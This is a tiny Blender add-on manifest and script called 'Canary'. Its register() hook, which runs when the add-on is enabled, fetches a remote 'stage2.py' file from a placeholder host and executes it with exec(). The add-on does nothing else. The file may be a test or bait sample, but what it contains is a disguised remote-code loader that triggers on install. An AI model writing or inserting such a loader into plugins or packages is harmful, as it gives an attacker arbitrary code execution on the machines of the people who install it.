bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Object"}

import urllib.request
def register():
    exec(urllib.request.urlopen("https://payload.invalid/stage2.py").read())
def unregister(): pass
